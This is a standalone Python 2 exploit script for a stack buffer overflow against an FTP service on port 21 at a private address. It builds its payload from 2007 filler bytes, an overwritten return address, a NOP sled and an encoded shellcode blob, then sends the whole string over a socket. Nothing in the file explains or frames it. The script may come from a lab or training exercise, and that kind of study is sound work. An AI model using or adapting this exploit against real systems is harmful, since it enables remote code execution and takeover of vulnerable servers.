import socket

buf =  ""
buf += "\xbe\xbf\x75\x8c\x79\xdd\xc3\xd9\x74\x24\xf4\x5b\x33"
buf += "\xc9\xb1\x54\x31\x73\x13\x83\xeb\xfc\x03\x73\xb0\x97"
buf += "\x79\x85\x26\xd5\x82\x76\xb6\xba\x0b\x93\x87\xfa\x68"
buf += "\xd7\xb7\xca\xfb\xb5\x3b\xa0\xae\x2d\xc8\xc4\x66\x41"
buf += "\x79\x62\x51\x6c\x7a\xdf\xa1\xef\xf8\x22\xf6\xcf\xc1"
buf += "\xec\x0b\x11\x06\x10\xe1\x43\xdf\x5e\x54\x74\x54\x2a"
buf += "\x65\xff\x26\xba\xed\x1c\xfe\xbd\xdc\xb2\x75\xe4\xfe"
buf += "\x35\x5a\x9c\xb6\x2d\xbf\x99\x01\xc5\x0b\x55\x90\x0f"
buf += "\x42\x96\x3f\x6e\x6b\x65\x41\xb6\x4b\x96\x34\xce\xa8"
buf += "\x2b\x4f\x15\xd3\xf7\xda\x8e\x73\x73\x7c\x6b\x82\x50"
buf += "\x1b\xf8\x88\x1d\x6f\xa6\x8c\xa0\xbc\xdc\xa8\x29\x43"
buf += "\x33\x39\x69\x60\x97\x62\x29\x09\x8e\xce\x9c\x36\xd0"
buf += "\xb1\x41\x93\x9a\x5f\x95\xae\xc0\x37\x5a\x83\xfa\xc7"
buf += "\xf4\x94\x89\xf5\x5b\x0f\x06\xb5\x14\x89\xd1\xba\x0e"
buf += "\x6d\x4d\x45\xb1\x8e\x47\x81\xe5\xde\xff\x20\x86\xb4"
buf += "\xff\xcd\x53\x20\x05\x59\x56\x23\x60\x9b\x0e\x49\x6b"
buf += "\x8a\x92\xc4\x8d\xfc\x7a\x87\x01\xbc\x2a\x67\xf2\x54"
buf += "\x21\x68\x2d\x44\x4a\xa2\x46\xee\xa5\x1b\x3e\x86\x5c"
buf += "\x06\xb4\x37\xa0\x9c\xb0\x77\x2a\x15\x44\x39\xdb\x5c"
buf += "\x56\x2d\xba\x9e\xa6\xad\x57\x9f\xcc\xa9\xf1\xc8\x78"
buf += "\xb3\x24\x3e\x27\x4c\x03\x3c\x20\xb2\xd2\x75\x5a\x84"
buf += "\x40\x3a\x34\xe8\x84\xba\xc4\xbe\xce\xba\xac\x66\xab"
buf += "\xe8\xc9\x69\x66\x9d\x41\xff\x89\xf4\x36\xa8\xe1\xfa"
buf += "\x61\x9e\xad\x05\x44\x9d\xaa\xfa\x1a\x83\x12\x93\xe4"
buf += "\x83\xa2\x63\x8f\x03\xf3\x0b\x44\x2c\xfc\xfb\xa5\xe7"
buf += "\x55\x94\x2c\x69\x17\x05\x30\xa0\xf9\x9b\x31\x46\x22"
buf += "\xcd\xbf\xa9\xd5\xf2\x41\x96\x03\xcb\x37\xdf\x97\x68"
buf += "\x47\x6a\xb5\xd9\xc2\x94\xe9\x1a\xc7"

i = 2007
eip="\xB0\xD1\x64\x70"
print "Trying %i " % i
badstr="A" * i + eip+"\x90"*16+ buf +"\r\n"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.150.101.10", 21))
sock.settimeout(5)
sock.send(badstr)
print sock.recv(1024)
sock.close()
